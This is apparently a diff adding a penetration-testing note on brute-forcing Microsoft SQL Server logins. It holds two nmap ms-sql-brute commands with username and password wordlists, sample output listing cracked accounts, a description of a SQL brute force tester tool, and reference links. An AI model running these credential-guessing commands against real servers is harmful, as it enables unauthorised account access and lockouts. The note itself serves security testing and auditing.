@@ -1,0 +1,32 @@
+
+
+- nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
+
+- nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>
+
+
+Script Output
+
+| ms-sql-brute:
+|   [192.168.100.128\TEST]
+|     No credentials found
+|     Warnings:
+|       sa: AccountLockedOut
+|   [192.168.100.128\PROD]
+|     Credentials found:
+|       webshop_reader:secret => Login Success
+|       testuser:secret1234 => PasswordMustChange
+|_      lordvader:secret1234 => Login Success
+
+
+-------------------------------
+ SQL Server Brute Force Tester
+-------------------------------
+
+Secure SQL Auditor provide SQL Brute Force testser tool which allows user to perform brute force attacks on an SQL Database Server. A brute force attack is a method of obtaining the user's authentication credentials. An attacker's common method is to guess the username password. brute force attacker mimics an attacker and conduct attack and try to login to the system by defeating password security. In this utility there are two files one containing usernames and other containing passwords are provided. This utility makes all the possible combinations and break password security. While performing penetration testing one can be very creative with the usernames and passwords files. User should always be careful in conducting this attack as it could result in locking system user account.
+
+http://resources.infosecinstitute.com/attacking-ms-sql-server-gain-system-access/
+https://nmap.org/nsedoc/scripts/ms-sql-brute.html
+http://www.secure-bytes.com/mssql-brute-force-tester.php
+https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/
+https://rdpguard.com/mssql-server-protection.aspx
